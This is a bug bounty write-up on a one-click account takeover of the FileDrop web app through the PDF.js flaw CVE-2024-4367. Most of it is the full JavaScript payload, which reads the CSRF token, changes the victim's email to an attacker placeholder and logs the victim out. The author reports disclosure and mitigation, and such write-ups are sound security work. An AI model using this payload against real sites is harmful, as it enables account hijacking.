---
title: FileDrop One Click ATO
date: 2026-02-01 19:32 -0400
categories: [bug bounty]
tags: [writeup, bug bounty]
---

This web application is vulnerable to CVE-2024-4367, a result of containing a vulnerable version of the PDF.js library.

https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/

With this vulnerability an attacker can leverage execution of JavaScript for a full account takeover. I have created a POC to demonstrate the severity of this vulnerability. 

Once the infected PDF is viewed by the signed in user, it triggers an email change to one controlled by the attacker. It then logs the user out, and with no knowledge of what the email was changed to, recovery is not possible through traditional means.

I used this [PoC](https://github.com/LOURC0D3/CVE-2024-4367-PoC) python script to generate the actual pdf file payload needed, as getting the syntax correct for this to work was challenging at first. Below is the final payload used (un-minified):

### Original Code
```
let pageUrl = 'https://app.getfiledrop.com/profile';

async function fetchAndExtractValue(url) {

  try { let response = await fetch(url);
    let htmlText = await response.text();
    let parser = new DOMParser();
    let doc = parser.parseFromString(htmlText, 'text/html');
    let nameInput = doc.getElementById('name')['value'];
    let csrfInput = doc.querySelectorAll('meta')[2]['content'];
    let myReturn = [nameInput, csrfInput];
    return myReturn;
  } catch (error) {
    return null;
  }
}

async function postData(data) {
	let payload1 = '_token=';
	let payload2 = '&_method=patch&name=';
	let payload3 = '&email=ATTACKEREMAIL%40ATTACKERDOMAIN.net';
	let data1 = data[1];
	let data2 = data[0];
	let totalpay = payload1 + data1 + payload2 + data2 + payload3;
	let xhr = new XMLHttpRequest();
	xhr.open('POST', pageUrl, true);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	await xhr.send(totalpay);
}
async function postdataLogOut(data){
    let payload1= "_token=" + data[1];
    let r = new XMLHttpRequest();
    r.open('POST','https://app.getfiledrop.com/logout',true);
    r.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    await r.send(payload1);
}
fetchAndExtractValue(pageUrl).then(persInfo => {
    postData(persInfo);
    postdataLogOut(persInfo);
});
```

### Minified Code

```
let pageUrl='https://app.getfiledrop.com/profile';async function fetchAndExtractValue(t){try{let e=await fetch(t),a=await e.text(),n=(new DOMParser).parseFromString(a,'text/html');return[n.getElementById('name').value,n.querySelectorAll('meta')[2].content]}catch(t){return null}}async function postData(t){let e='_token='+t[1]+'&_method=patch&name='+t[0]+'&email=ATTACKEREMAIL%40ATTACKERDOMAIN.net',a=new XMLHttpRequest;a.open('POST',pageUrl,true),a.setRequestHeader('Content-Type','application/x-www-form-urlencoded'),await a.send(e)}async function postdataLogOut(t){let e='_token='+t[1],a=new XMLHttpRequest;a.open('POST','https://app.getfiledrop.com/logout',true),a.setRequestHeader('Content-Type','application/x-www-form-urlencoded'),await a.send(e)}fetchAndExtractValue(pageUrl).then((t=>{postData(t),postdataLogOut(t)}));
```

### PoC in action
{%
  include embed/video.html
  src='/assets/img/FileDropPoC.mp4'
  types='mp4'
  title='Demo video'
  autoplay=true
  loop=true
  muted=true
%}

### Follow-Up

The vulnerability on this site has since been mitigated after a couple weeks of notification to the site owner.